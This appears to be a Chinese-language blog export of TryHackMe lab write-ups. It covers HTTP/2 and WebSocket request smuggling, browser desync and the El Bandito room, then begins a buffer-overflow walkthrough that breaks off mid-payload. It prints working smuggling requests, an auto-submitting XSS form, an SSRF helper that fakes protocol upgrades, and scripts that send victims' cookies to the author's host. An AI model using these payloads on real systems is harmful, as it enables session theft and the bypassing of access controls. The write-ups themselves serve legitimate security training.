请求走私是有可能发生的。攻击者并不是直接利用 HTTP&#x2F;2 的漏洞，而是通过精心构造的 HTTP&#x2F;2 请求，来影响前端代理将其转换为 HTTP&#x2F;1.1 请求的方式。 理想情况下，前端代理应该能完美地将一个 HTTP&#x2F;2 请求精确转换为一个等效的 HTTP&#x2F;1.1 请求。然而，在实际操作中，不同的代理实现方式会造成转换上的细微差异。攻击者正是利用这些差异，诱使代理在后端连接中生成畸形或意料之外的 HTTP&#x2F;1.1 请求，从而导致HTTP 脱同步（desync）。 预期行为H2.CLHTTP&#x2F;2 不需要 content-length ，但是目前的现代浏览器会把他加上去预防 HTTP 降级。 如果前端带了一个大小为 0 的 content-length 过去，那么原始 Body 会拼接到新请求的后面。 H2.TE我们同样能加 Transfer-Encoding: chunked 头部到前端 HTTP&#x2F;2 请求，代理也可能将其原封不动地传递给后端 HTTP&#x2F;1.1 连接。如果后端服务器优先选择这个头部去定义请求体的大小，我们能再次使这个连接去同步。 可以看到一个请求里面又包含了一个新的请求，后端会解析那个 0 ，把后面的一块当成新的请求来处理。 CRLF injection这个就和 HTTP&#x2F;1.1 有关系了，因为 HTTP&#x2F;1.1 就是用 \\r\\n 来分隔字段的，一个空行里面插一个 \\r\\n 然后下一行跟着一个 GET 请求，就是新的一条请求了。 利用有两种利用方式，一种是请求隧道，一种是去同步。 H2.CL通过修改 CL 为 0 ，同时修改 body 为特定字段，导致下一个请求的人的请求被拼接，造成 CSRF。 12GET /post/like/12315198742342 HTTP/1.1 X: f 为什么能造成这样，是因为前端代理服务器把这个拆成 2 条请求了，上面这个 payload 会等待受害者的请求，一旦受害者请求，他的请求会被拼接在这后面，变成 123456GET /post/like/xxx HTTP/1.1\\r\\n X: fGET / HTTP/1.1\\r\\n Host: xxxx\\r\\n User-Agent: xxx\\r\\n Cookie: COOKIE_STRING\\r\\n \\r\\n 这样受害者就会携带他的 Cookie 去访问我们定义好的那个端点。 记得要在 Burp 里面取消更新 Content-Length，还有那个 payload 末尾不要有 \\r\\n，执行一次要等待 30s 去等待受害者去访问页面。 还有这个我实测是需要前一个请求是 POST 请求，如果是 GET 不生效。 Leaking Internal Headers通过构造好的 payload 让别人的请求拼接在你的请求的参数里面，导致回显，这个例子是前端代理的 header 字段，比如这个 header 里面有一些密钥或者鉴权之类的 token，可以通过这种方式偷出来。 这个例子是利用前端的一个搜索参数，填在搜索区域的参数有回显导致的，和反射型 XSS 类似。 123456789abcd Host: 10.10.161.96:8100 POST /hello HTTP/1.1 Content-Length: 300 Host: 10.10.161.96:8100 Content-Type: application/x-www-form-urlencoded q= 这里同样记得把更新 Content-Length 关掉 Bypassing Frontend Restrictions这个其实是一条请求里面混两条请求，用 POST 请求的目的是为了避免缓存 12345abcd Host: 10.10.161.96:8100 GET /admin HTTP/1.1 X-Fake: a 这个方法也同样可以去绕 WAF，因为这个请求看起来我们是在访问一个合法的端点 Web Cache Poisoning 缓存投毒这个就不用过多解释了，投毒后 CSRF。 偷 cookie payload 要找一个文件上传点传上去，这里内置好了 12345678var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;&amp; this.status == 200) { document.getElementById(&quot;demo&quot;).innerHTML = xhttp.responseText; } }; xhttp.open(&quot;GET&quot;, &quot;https://10.11.141.2:8002/?c=&quot;+document.cookie, true); xhttp.send(); 生成自签证书 1openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj &quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot; HTTPS 服务端 12345678910111213141516171819202122232425from http.server import HTTPServer, BaseHTTPRequestHandler import ssl # 定义服务器地址和端口 host = &#39;0.0.0.0&#39; port = 8002 # 1. 创建一个 SSLContext 对象 # ssl.PROTOCOL_TLS_SERVER 是推荐用于服务器的协议版本，它会自动协商最新的TLS版本 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) # 2. 加载证书和私钥 # keyfile 是私钥文件路径，certfile 是证书文件路径 context.load_cert_chain(certfile=&quot;cert.pem&quot;, keyfile=&quot;key.pem&quot;) # 创建 HTTP 服务器实例 httpd = HTTPServer((host, port), BaseHTTPRequestHandler) # 3. 使用 SSLContext 实例的 .wrap_socket() 方法来包装服务器的套接字 httpd.socket = context.wrap_socket(httpd.socket, server_side=True) print(f&quot;HTTPS server running on https://{host}:{port}/&quot;) # 启动服务器 httpd.serve_forever() burp payload 1234bar Host: 10.10.161.96:8100 GET /static/uploads/myjs.js HTTP/1.1 记得在 HTTP&#x2F;2.0 header 里面加一个 pragma: no-cache 测试缓存是否生效 1curl -kv https://10.10.161.96:8100/static/text.js H2c 走私HTTP 版本协商Web 服务器能够在单个端口上提供多种 HTTP 协议版本。这样做的好处是，它无需保证用户浏览器一定支持 HTTP&#x2F;2。通过这种方式，服务器可以同时提供 HTTP&#x2F;1.1 和 HTTP&#x2F;2，客户端则可以自行选择想要使用的版本。这个过程被称为协议协商（negotiation），并且完全由你的浏览器负责处理。 原始的 HTTP&#x2F;2 标准定义了2种方式去协商 HTTP&#x2F;2，取决于双方之间的通信加密了没有。 h2： 当 HTTP&#x2F;2 运行在 TLS 加密通道上时，使用的就是 h2 协议。它依赖于 TLS 的应用层协议协商 (ALPN) 机制来提供 HTTP&#x2F;2 服务。 h2c： h2c 指的是在明文通道上运行的 HTTP&#x2F;2。这通常在没有加密可用的场景下使用。由于 ALPN 是 TLS 的一个特性，因此无法在明文通道中使用它。在这种情况下，客户端会发送一个初始的 HTTP&#x2F;1.1 请求，并附加几个特定的头部来请求升级到 HTTP&#x2F;2。如果服务器确认并接受这些额外的头部，连接就会成功升级到 HTTP&#x2F;2。 升级到 h2c当协商建立一个明文的 HTTP&#x2F;2 连接时，客户端会发送一个常规的 HTTP&#x2F;1.1 请求，其中包含 Upgrade: h2c 头部，以告知服务器它支持 h2c。该请求还必须包含一个额外的 HTTP2-Settings 头部，其中带有我们在此不详细讨论的协商参数。一个符合规范的服务器将以 101 Switching Protocols 响应来接受升级。从那时起，连接就会切换到 HTTP&#x2F;2 协议。 这个其实是用访问合法端点构建起 HTTP&#x2F;2 隧道之后，再用隧道进行访问，从而绕过前端的限制。 这里要用 h2csmuggler 工具，原版要用老版 python 跑，我修改之后支持 python3.14 同时修复了自签证书的问题。 推荐阅读 HTTP&#x2F;2: The Sequel is Always Worse by James Kettle. h2c Smuggling: Request Smuggling Via HTTP&#x2F;2 Cleartext (h2c) by Jake Miller. 番外为什么 HTTP&#x2F;2 能有效避免 HTTP&#x2F;1.1 中常见的由于连接复用导致的请求走私？ 这主要归结于 HTTP&#x2F;2 在协议设计上的根本性改变，尤其是它处理请求和响应边界的方式。 HTTP&#x2F;1.1 走私的根本原因在 HTTP&#x2F;1.1 中，请求走私之所以普遍，是因为存在多种方式来定义请求体的结束位置（比如 Content-Length 和 Transfer-Encoding: chunked）。当中间代理服务器和后端服务器对这些定义解析不一致时，它们就会对同一个 TCP 连接上的 HTTP 请求边界产生不同的理解。 想象一下，HTTP&#x2F;1.1 就像是发送一连串没有明确分界线的文字，代理和服务器各自揣摩哪句话在哪里结束，这就很容易出错，导致后面的文字被当成了另一句话的开头。 HTTP&#x2F;2 如何解决这个问题HTTP&#x2F;2 从根本上重构了数据传输方式，引入了二进制分帧层（Binary Framing Layer）。这就好比 HTTP&#x2F;2 不再发送一连串文字，而是发送一个个带有明确标签和长度的包裹。 具体来说，HTTP&#x2F;2 解决了 HTTP&#x2F;1.1 中走私问题的关键点有： 精确的长度指示器： 在 HTTP&#x2F;2 中，所有的 HTTP 消息（包括请求和响应）都被分解成更小的、独立的二进制帧（frames）。每个帧都有一个明确的类型（例如，HEADERS 帧用于头部，DATA 帧用于请求体）和精确的长度字段。 这意味着，无论是请求头、请求体，还是其他元数据，都被封装在自带大小信息的帧中。解析器不再需要依赖 Content-Length 或 Transfer-Encoding 这样的头部来推断请求体的长度，因为数据帧本身就包含了精确的长度信息。 举个例子，一个 HEADERS 帧会明确告诉你它包含多少字节的头部数据，一个 DATA 帧会明确告诉你它包含多少字节的请求体数据。 单一、严格的解析逻辑： HTTP&#x2F;2 的解析器只遵循这一套严格的二进制分帧规则。它不会像 HTTP&#x2F;1.1 那样，在 Content-Length 和 Transfer-Encoding 之间进行选择或优先级判断。这种单一且强制的解析机制消除了前端代理和后端服务器对请求边界产生歧义的可能性。 连接复用与多路复用： 尽管 HTTP&#x2F;2 也支持连接复用，但它使用的是多路复用（Multiplexing）。这意味着在同一个 TCP 连接上，可以同时传输多个独立的请求和响应。每个请求&#x2F;响应流都有自己的唯一标识符，并且它们的帧可以交错发送，但由于每个帧都带有流 ID 和长度信息，它们在接收端可以被正确地重组。这进一步增强了请求之间的隔离性，降低了相互干扰的风险。 Request Smuggling: WebSockets这个房间本质上还是利用 HTTP 的漏洞，只不过是利用了协议升级，前后端服务器存在的行为不一致的问题。 从 HTTP 升级到 Websockets客户端发起一个 HTTP 请求，其中包含 Upgrade: websocket 头部。如果服务器支持 WebSocket 协议，它就会回复 101 Switching Protocols 响应，并相应地升级该连接。从那一刻起，连接将使用 WebSocket 协议而非 HTTP 协议。 如果你在中间引入一个代理，情况就会变得有趣起来：大多数代理服务器不会亲自处理 WebSocket 升级请求，而是将其直接转发给后端服务器。一旦连接成功升级，代理就会在客户端和后端服务器之间建立一条隧道。这样一来，所有后续的 WebSocket 流量都将不受干扰地直接转发到后端服务器。 我们现在面临的问题是，这条隧道使用的是 WebSocket 协议而非 HTTP。如果此时我们尝试利用这条隧道来走私一个 HTTP 请求，后端服务器将会拒绝它，因为它此时正期待接收 WebSocket 请求。 那我们能不能让代理服务器到后端服务器的连接不升级呢？或者是能不能让代理服务器误认为这个连接升级，然后建立起这个隧道。 通过有缺陷的 WebSocket 隧道走私 HTTP 请求为了通过一个有漏洞的代理服务器走私请求，我们可以创建一个畸形请求，让代理服务器误认为正在执行 WebSocket 升级，但后端服务器实际上并没有升级连接。这将迫使代理在客户端和服务器之间建立一个隧道，由于代理假设这已是一个 WebSocket 连接，因此它不会再检查隧道内的流量，而后端服务器却仍然期望接收 HTTP 流量。 强制实现（即让代理建立一个未检查的隧道，而后端仍期望 HTTP 流量）的一种方法是，发送一个带有无效 Sec-WebSocket-Version 头部的升级请求。但是后端会发一个 426 Upgrade Required 响应去表示这个升级是不成功的。 一般 Sec-WebSocket-Version 是 13，我们可以填一个高于这个版本的就行。 但是某些代理会不管后端服务器的响应，假定这个升级是始终完成的。然后这个假的 WebSocket 隧道就建立起来了，我们就可以往里面发送 HTTP 请求了。 但是这个技巧不会去污染别的用户的请求，所以我们只能用来绕过前端的一些请求限制。 123456789GET /socket HTTP/1.1 Host: MACHINE_IP:8001 Sec-WebSocket-Version: 777 Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg== GET /flag HTTP/1.1 Host: MACHINE_IP:8001 绕过代理限制跟着 Room 走就行，我用的 Payload 如下，注意最后有两个回车，还有记得取消 Update Content-Length。 123456789GET /socket HTTP/1.1 Host: MACHINE_IP:8001 Sec-WebSocket-Version: 777 Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg== GET /flag HTTP/1.1 Host: MACHINE_IP:8001 如果失败的话，可以用 nc 发请求，一样的。 绕过”安全“的代理某些代理会检验后端是否发送了成功升级的请求，如果没有，就不升级连接。但是我们可以通过 SSRF 来实现这点。 下面是一个会始终发送 101 Switching Protocols 响应的代码，我们通过 SSRF，导致后端会回显这个响应，欺骗代理服务器连接已经建立了，建立起 WebSocket 隧道。 12345678910111213141516import sys from http.server import HTTPServer, BaseHTTPRequestHandler if len(sys.argv)-1 != 1: print(&quot;&quot;&quot; Usage: {} &quot;&quot;&quot;.format(sys.argv[0])) sys.exit() class Redirect(BaseHTTPRequestHandler): def do_GET(self): self.protocol_version = &quot;HTTP/1.1&quot; self.send_response(101) self.end_headers() HTTPServer((&quot;&quot;, int(sys.argv[1])), Redirect).serve_forever() 前端用的 Payload 如下 123456789GET /check-url?server=http://10.11.141.2:5555 HTTP/1.1 Host: 10.10.12.34:8002 Sec-WebSocket-Version: 13 Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg== GET /flag HTTP/1.1 Host: 10.10.12.34:8002 推荐阅读 https://github.com/0ang3el/websocket-smuggle HTTP Browser Desync利用 HTTP Keep-Alive 特性，一个请求不会实际上关闭这个连接，在一个 POST 请求后面拼接一些构造好的请求。 具体场景的我不太清楚怎么做，但是在下一个 Task 带着我们做了这一点，在页面刷新之后会跳转到构造好的那个端点里面。 这个是用来测试网页是否存在去同步漏洞的 Payload。 12345fetch(&#39;http://MACHINE_IP:5000/&#39;, { method: &#39;POST&#39;, body: &#39;GET /redirect HTTP/1.1\\r\\nFoo: x&#39;, mode: &#39;cors&#39;, }) 就相当于下一条请求是请求 &#x2F;redirect 这个 URL。不管实际上请求的是啥，具体的 HTTP 包可以看上面👆那个图。 HTTP 浏览器去同步漏洞链 XSSPayload 如下 12345678&lt;form id=&quot;btn&quot; action=&quot;http://challenge.thm/&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;textarea name=&quot;GET http://YOUR_IP HTTP/1.1 AAA: A&quot;&gt;placeholder1&lt;/textarea&gt; &lt;button type=&quot;submit&quot;&gt;placeholder2&lt;/button&gt; &lt;/form&gt; &lt;script&gt; btn.submit() &lt;/script&gt; 注意这里 enctype 是 text&#x2F;plain，他会将表单字段的 name 属性和 value 属性原样拼接，并且使用换行符 (\\r\\n) 作为不同字段之间的分隔符。然后实际的请求体是： 1GET http://YOUR_IP HTTP/1.1\\r\\nAAA: A=placeholder1 页面加载之后，这个表单会自动提交，无须用户点击。 挑战给了我们一个页面，其实这个可以直接用 XSS 偷出来，但是题目给的 wp 是用了去同步 + XSS，下面是用到的一些 Payload。 前端用的 XSS 12345678&lt;form id=&quot;btn&quot; action=&quot;http://challenge.thm/&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;textarea name=&quot;GET http://10.11.141.2:1337 HTTP/1.1 AAA: A&quot;&gt;placeholder1&lt;/textarea&gt; &lt;button type=&quot;submit&quot;&gt;placeholder2&lt;/button&gt; &lt;/form&gt; &lt;script&gt; btn.submit() &lt;/script&gt; 发送 Payload 的服务器 123456789101112131415161718192021#!/usr/bin/python3 from http.server import BaseHTTPRequestHandler, HTTPServer class ExploitHandler(BaseHTTPRequestHandler): def do_GET(self): if self.path == &#39;/&#39;: self.send_response(200) self.send_header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;) self.send_header(&quot;Content-type&quot;,&quot;text/html&quot;) self.end_headers() self.wfile.write(b&quot;fetch(&#39;http://10.11.141.2:8080/&#39; + document.cookie)&quot;) def run_server(port=1337): server_address = (&#39;&#39;, port) httpd = HTTPServer(server_address, ExploitHandler) print(f&quot;Server running on port {port}&quot;) httpd.serve_forever() if __name__ == &#39;__main__&#39;: run_server() El Bandito技术点：Spring 薄弱点 + WebSocket 伪造 + HTTP&#x2F;2 降级 HTTP&#x2F;1.1 利用 信息收集阶段1nmap -sC -sV -p 22,80,631,8080 elbandito.thm 80 端口打不开，其实是 https 这里学到了可以通过指定端口号再加 -sC 探测服务 1nmap -sC -sV -p 22,80,631,8080 elbandito.thm 631 有一个 cups 服务器，这个实际上一点用都没有，还以为切入点在这里 8080 是一个 web 服务器。网页里面有请求发起 websocket 连接，但是返回失败。然后图标是一个 Spring 的图标。 Step 1从这里 http://10.10.138.222:8080/services.html 发现两个域名，加进 hosts bandito.websocket.thm bandito.public.thm 实际上这个一点用都没有，查看页面源代码里面发现看到他是请求一个 isOnline 的接口，这里我们是不是可以想到 SSRF 呢，先本地搭一个服务端，url 填进去测试 ok。然后试试能不能伪造 WebSocket 升级成功的消息，同样可以。 找切入点通过 Gobuster 遍历出来了一堆目录，但是没有什么有效信息，但是通过这个网页给了我一点启发。 https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html Spring 有可以拿到信息的接口，但是有些地方是不允许访问的，我觉得是加了来源 IP 验证之类的机制，有下面这些： /dump, /trace, /logfile, /shutdown, /mappings, /env, /actuator/env, /restart, and /heapdump. 有了目标之后，就可以利用 SSRF 去伪造 WebSocket 升级，然后利用去访问受限制的端点。 123456789GET //isOnline?url=http://10.11.141.2:5555 HTTP/1.1 Host: bandito.websocket.thm:8080 Sec-WebSocket-Version: 13 Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg== GET /env HTTP/1.1 Host: bandito.websocket.thm:8080 发现 /admin-creds 和 /admin-flag ，顺利拿到第一关的 flag 和第二关的入口。 补充在 Spring 应用程序中，&#x2F;trace 端点通常与 Spring Boot Actuator 模块相关联。它的主要作用是提供对最近 HTTP 请求的追踪信息。 &#x2F;trace 端点的作用当 Spring Boot Actuator 的 &#x2F;trace 端点被启用并暴露时，访问这个路径会返回一个 JSON 格式的列表，其中包含了应用程序最近处理过的 HTTP 请求的详细信息。这些信息通常包括： 请求方法 (e.g., GET, POST) 请求路径 (e.g., &#x2F;api&#x2F;users) 请求头 (Headers) 响应头 (Headers) HTTP 状态码 (e.g., 200 OK, 404 Not Found) 请求时间戳 请求耗时 Step 2注意这一关是 https 的 80 端口，登录进去之后发现是一个聊天室应用，刚开始尝试 XSS 都被 SOP 拦了，后面看了一下 wp 才知道，这个是利用 HTTP&#x2F;2 可能兼容 HTTP&#x2F;1.1 的机制。一个端口可以支持 HTTP&#x2F;2 也可以支持 HTTP&#x2F;1.1，然后利用页面上的一些可以回显或者存储的地方，把别人的请求头偷出来。 我的 Payload 如下，注意取消掉那个更新 Content-Length，刚开始发现 Content-Length 太小了没抓到想要的信息，后面改大了点成功拿下。 12345678910111213141516171819202122232425262728293031323334353637383940414243POST /send_message HTTP/2 Host: bandito.public.thm:80 Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4 Content-Length: 0 Pragma: no-cache Cache-Control: no-cache Sec-Ch-Ua-Platform: &quot;Windows&quot; Accept-Language: zh-CN,zh;q=0.9 Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot; Content-Type: application/x-www-form-urlencoded Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Accept: */* Origin: https://bandito.public.thm:80 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://bandito.public.thm:80/messages Accept-Encoding: gzip, deflate, br Priority: u=1, i POST /send_message HTTP/1.1 Host: bandito.public.thm:80 Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4 Content-Length: 700 Pragma: no-cache Cache-Control: no-cache Sec-Ch-Ua-Platform: &quot;Windows&quot; Accept-Language: zh-CN,zh;q=0.9 Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot; Content-Type: application/x-www-form-urlencoded Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Accept: */* Origin: https://bandito.public.thm:80 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://bandito.public.thm:80/messages Accept-Encoding: gzip, deflate, br Priority: u=1, i data= data= 后面不要有任何数据。 其他其实这个房间好奇怪，我发现他用了 HTTP&#x2F;2 但是那些伪头一个都没用，然后他这种 HTTP2 和 HTTP1.1 混在一个包里面发，我很好奇他实际发出去的数据包是什么样的，看 burp 中的 hex 格式，里面分隔也用的是 0d 0a ，或许要用 Wireshark 抓包才能看到实际的数据包格式。 这章总体来说难度不高，但是还是挺考验之前 Rooms 所学到的东西的。光研究这一个 Room 我的一个下午就没了，不过也把 WAP 结束了。 不过发现了一个有用的网站：https://book.hacktricks.wiki/ 里面有很多针对不同应用的思路，挺好的","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://blog.irec.moe/tags/WEB/"}]},{"title":"Try Hack Me - Buffer Overflow Prep","slug":"THM/20250708_Buffer_Overflow_Prep/Buffer_Overflow_Prep","date":"2025-07-07T16:00:00.000Z","updated":"2025-07-07T17:54:35.000Z","comments":true,"path":"/thm_bufferoverflow.html","permalink":"https://blog.irec.moe/thm_bufferoverflow.html","excerpt":"","text":"Room：https://tryhackme.com/room/bufferoverflowprep 首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。 背景知识EIPEIP 是 x86 架构（32 位）CPU 中的一个特殊寄存器。它非常重要，因为它存储着 CPU 下一条要执行的指令的内存地址。 Immunity Debugger是调试器，类似 OllyDbg x64dbg &#x2F; x32dbg 这种软件，分析调试软件用的。 MonaMona 是一个功能强大的 Python 脚本，专门设计用于扩展和增强 Immunity Debugger 或 WinDbg 这类调试器的功能。它在**漏洞利用（Exploit Development）和逆向工程（Reverse Engineering）领域非常受欢迎，特别是用于自动化许多在缓冲区溢出（Buffer Overflow）**漏洞利用过程中繁琐且耗时的任务。 模式字符串（Pattern String）是在缓冲区溢出漏洞利用中用于精确计算 EIP（指令指针）偏移量的一种特殊字符串。它由一系列唯一且按特定算法生成的字符或字节组成，其独特性在于字符串中的任何一个固定长度的片段都只会在整个字符串的唯一一个位置出现。当你将足够长的模式字符串作为输入发送给易受攻击的程序，并导致其崩溃时，被模式字符串片段覆盖的 EIP 寄存器值就如同一个“指纹”或“线索”。通过工具（如 Metasploit 的 pattern_offset.rb 或 Mona 的 findmsp 命令）反向查找这个“指纹”在原始模式字符串中的位置，你就能精确地确定从输入起始点到 EIP 的字节偏移量，从而知道需要填充多少垃圾数据才能精准控制程序执行流。 字节序（Endianness）字节序指的是多字节数据（例如一个 32 位整数或一个内存地址）在计算机内存中存储的字节顺序。主要有两种类型： 大端序 (Big-Endian)： 最高有效字节 (Most Significant Byte, MSB) 存储在最低内存地址。 就像我们写数字一样：0x12345678 会被存储为 12 34 56 78。 小端序 (Little-Endian)： 最低有效字节 (Least Significant Byte, LSB) 存储在最低内存地址。 0x12345678 会被存储为 78 56 34 12。 坏字符（Bad Characters）在缓冲区溢出漏洞利用中，你的目标是将一段特定的字节序列（通常是 Shellcode 和返回地址）写入到程序的内存中。然而，程序在处理输入时，可能会使用一些字符串操作函数（例如 C 语言中的 strcpy()、strcat()、sprintf() 等）。 这些函数有特定的行为： 空字节 (\\x00)： 这是最常见的坏字符。许多字符串函数会将 \\x00 解释为字符串的结束符。如果你的 Shellcode 中包含 \\x00，那么当这些函数复制你的 Payload 时，它们会在遇到第一个 \\x00 时就停止复制，导致 \\x00 后面的 Shellcode 部分被截断，无法完整写入内存，从而执行失败。 其他特殊字符： 除了 \\x00，某些应用程序或协议可能还会对其他特定字节值进行特殊处理。例如： 回车 (\\x0d) 和换行 (\\x0a)： 在某些基于行的输入协议中，这些字符可能被视为行的结束符，导致你的 Payload 被截断。 空 ASCII 字符 (\\x20，空格)： 有些协议可能不允许在特定位置出现空格。 其他 ASCII 控制字符或编码问题： 有些应用程序在处理某些字节值时可能会将其误认为是控制字符，导致数据被修改或丢弃。 连接机器这里我试了好久，网上关于 xfreerdp3 的教程基本上没有。实际上这个软件体验很差，我最后用 socat 映射 3389 给本机，用 mstsc 。 1xfreerdp3 /u:admin /p:password /cert:ignore /sec:rdp /tls:enforce:1.0 /v:10.10.3.91 打开 Immunity Debugger 执行这个命令，设置 mona 的工作文件夹。 1!mona config -set workingfolder c:\\mona\\%p 然后让我们用 nc 连一下服务器，是一个交互程序，好像是让我测试不同的入口会发生什么不一样的错误这样。 找崩溃区间生成了一个一直增加发送字符的脚本，步进是 100bytes 1234567891011121314151617181920212223242526#!/usr/bin/env python3 import socket, time, sys ip = &quot;10.10.3.91&quot; port = 1337 timeout = 5 prefix = &quot;OVERFLOW1 &quot; string = prefix + &quot;A&quot; * 100 while True: try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) s.connect((ip, port)) s.recv(1024) print(&quot;Fuzzing with {} bytes&quot;.format(len(string) - len(prefix))) s.send(bytes(string, &quot;latin-1&quot;)) s.recv(1024) except: print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix))) sys.exit(0) string += 100 * &quot;A&quot; time.sleep(1) 2000bytes 崩溃。 崩溃复现和控制 EIP12# 生成一个超过崩溃阈值 400bytes 的文本 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 这是让我们找那个崩溃的临界点，加400字节我猜是增加一点容错。替换到代码中的 payload 部分。 123456789101112131415161718192021222324import socket ip = &quot;10.10.3.91&quot; port = 1337 prefix = &quot;OVERFLOW1 &quot; offset = 0 overflow = &quot;A&quot; * offset retn = &quot;&quot; padding = &quot;&quot; payload = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6C